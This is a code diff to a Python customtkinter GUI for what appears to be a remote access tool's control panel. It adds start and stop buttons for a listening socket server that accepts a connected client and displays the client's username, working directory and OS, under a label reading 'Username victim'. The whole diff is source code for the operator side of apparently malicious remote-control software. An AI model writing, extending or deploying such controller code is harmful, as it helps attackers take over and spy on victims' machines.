@@ -223,31 +223,27 @@ def server(parent_frame, go_back_callback=None):
         safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
         safe_textbox_insert(text_box, f"🖥️ ОС: {current_OS}\n")
 
+    server_socket = None
+    server_thread = None
+    server_running = [False]  # список, чтобы замыкание могло изменять
+
     def start_server_thread(server_socket, text_box, status_label, username_label, dir_label, os_label):
-        while True:
+        while server_running[0]:
             try:
                 client_socket, client_address = server_socket.accept()
                 active_client[0] = client_socket
                 status_label.configure(text="🟢 Connected", text_color="green")
                 print(f"Клиент подключен: {client_address}")
-                text_box.insert("end", "Client is connected")
+                safe_textbox_insert(text_box, "Client is connected\n")
                 client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label, dir_label, os_label))
                 client_thread.daemon = True
                 client_thread.start()
             except Exception as e:
-                print(f"Ошибка подключения: {e}")
-                safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
-                status_label.configure(text="🔴 Error", text_color="red")
+                if server_running[0]:
+                    print(f"Ошибка подключения: {e}")
+                    safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
+                    status_label.configure(text="🔴 Error", text_color="red")
                 break
-
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Чтобы избежать WinError 10048
-    try:
-        server_socket.bind(('0.0.0.0', port))
-        server_socket.listen(1)
-    except OSError as e:
-        print(f"Ошибка при привязке сокета: {e}")
-        return  # Можно вывести это в UI
 
     # Основной контейнер с горизонтальным разделением (левая и правая части)
     main_frame = ctk.CTkFrame(parent_frame, fg_color="#0f0f0f")
@@ -315,9 +311,40 @@ def server(parent_frame, go_back_callback=None):
 
     # === Кнопка для старта сервера ===
     def run_server():
-        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label, dir_label, os_label))
-        thread.daemon = True
-        thread.start()
+        nonlocal server_socket, server_thread
+        if server_running[0]:
+            safe_textbox_insert(text_box, "Сервер уже запущен.\n")
+            return
+        try:
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket.bind(('0.0.0.0', port))
+            server_socket.listen(1)
+        except OSError as e:
+            safe_textbox_insert(text_box, f"Ошибка при запуске сервера: {e}\n")
+            return
+
+        server_running[0] = True
+        server_thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label, dir_label, os_label))
+        server_thread.daemon = True
+        server_thread.start()
+        safe_textbox_insert(text_box, f"Сервер запущен и слушает порт {port}...\n")
+        status_label.configure(text="🟢 Server running", text_color="green")
+
+    def stop_server():
+        nonlocal server_socket, server_thread
+        if not server_running[0]:
+            safe_textbox_insert(text_box, "Сервер не запущен.\n")
+            return
+        server_running[0] = False
+        try:
+            if server_socket:
+                server_socket.close()
+                server_socket = None
+            safe_textbox_insert(text_box, "Сервер остановлен.\n")
+            status_label.configure(text="🔴 Server stopped", text_color="red")
+        except Exception as e:
+            safe_textbox_insert(text_box, f"Ошибка при остановке сервера: {e}\n")
 
     username_label = ctk.CTkLabel(menu_frame, text="Username victim: Unknown", width=300)
     username_label.place(x=10, y=10)
@@ -330,6 +357,9 @@ def server(parent_frame, go_back_callback=None):
 
     start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=lambda: run_server())
     start_server_btn.pack(pady=10)
+
+    stop_server_btn = ctk.CTkButton(left_frame, text="🚫 Stop Server", command=lambda: stop_server())
+    stop_server_btn.pack(pady=10)
 
     back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
     back_btn.pack(pady=10)
